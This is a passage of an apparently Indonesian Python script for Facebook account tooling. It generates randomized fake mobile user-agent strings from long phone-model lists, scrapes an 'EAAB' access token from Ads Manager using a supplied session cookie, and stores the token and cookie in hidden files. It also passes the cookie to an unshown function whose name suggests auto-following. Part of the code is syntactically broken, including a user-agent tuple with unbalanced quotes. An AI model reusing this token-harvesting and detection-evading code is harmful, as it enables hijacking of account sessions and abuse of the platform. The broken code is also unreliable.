    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvnokiax = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    uateddy = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix, strvsamsung, strvredmi1, strvnokiax, strvgt])
    ugen.append(uateddy)
	try:

		lnux = (
		    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
            "Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36"
             
			"Dalvik/2.1.0 (Linux; U; Android 7.0.0; Redmi 5A Build/OPM3.171019.016)"
			"Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1719 Build/OPM2.171019.029)"
			"Dalvik/2.1.0 (Linux; U; Android  8.1.1; vivo 1612 Build/NRD90M)"
			"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A Build/RP1A.200720.011)"
			"Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])"
			
			
			
			)

		head = {

			"User-Agent": lnux

			}

		link = ses.get(

			"https://web.facebook.com/adsmanager?_rdc=1&_rdr",

			headers=head,

			cookies = {

				"cookie" : cok

				}

			)

		find = re.findall(

			'act=(.*?)&nav_source',

			link.text

			)

		if len(find)==0: 

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]cookie anda invalid",

					width=48,

					style="bold purple",

					),

				justify="center"

				)

			sleep(

				2

				)

			exit(

			)

		else:

			for x in find:

				xz = ses.get(

					"https://web.facebook.com/adsmanager/manage/campaigns?act="+x+"&nav_source=no_referrer",

					headers = head,

					cookies = {

						"cookie" : cok

						}

					)

				took = re.search(

					'(EAAB\w+)',

					xz.text

					).group(

						1

					)

				open(

					".tok.txt",

					"w"

					).write(

						took

					)

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]token facebook anda",

						style="bold purple",

						),

					justify="center"

				)

				Console(

					).print(

						f"[bold white]{took}"

					)

				Console(width=48).print(

					Panel("[bold #FF00D4]login cookie berhasil",

					style="bold purple",

					),

				justify="center"

				)

				Ikuti_Boleh_Ya(

					cok

				)

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]enter untuk ke menu",

						width=48,

						subtitle="╭──",

						subtitle_align="left",

						style="bold purple",

						),

					justify="center"

				)

				Console().input(

					"[bold purple]   ╰─> "

					)

				Back_Menu(

				)

	except (Exception) as e:

		exit(

			e

		)

def Main_Menu():

	try:

		token = open(

			'.tok.txt',

			'r'

		).read()

		cok = open(

			'.cok.txt',

			'r'

		).read()

	except (IOError, FileNotFoundError):

		Console(width=48).print(

			Panel(

				'[bold red]cookies anda kadaluarsa',

				style="bold purple",

				),

			justify="center"

		)

		sleep(

			2

			)

		Login_Dulu(

		)

	try:

		data_efbi = requests.get(

			f"https://graph.facebook.com/me?fields=name,id&access_token={token}",

			cookies = {

				'cookie'

				 :  

				 cok

			}

		).json()

		nama_fb = data_efbi[

			'name'

		]

		uids_fb = data_efbi[

			'id'

		]

	except (requests.exceptions.ConnectionError):

			Console(width=48).print(

				Panel(

					"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",

					width=48,

					style="bold purple",

					),

				justify="center",

				)

			exit(

			)

	except (KeyError):

		try:

			os.remove(

				".cok.txt"

				)

			os.remove(

				".tok.txt"

			)

		except:

			pass

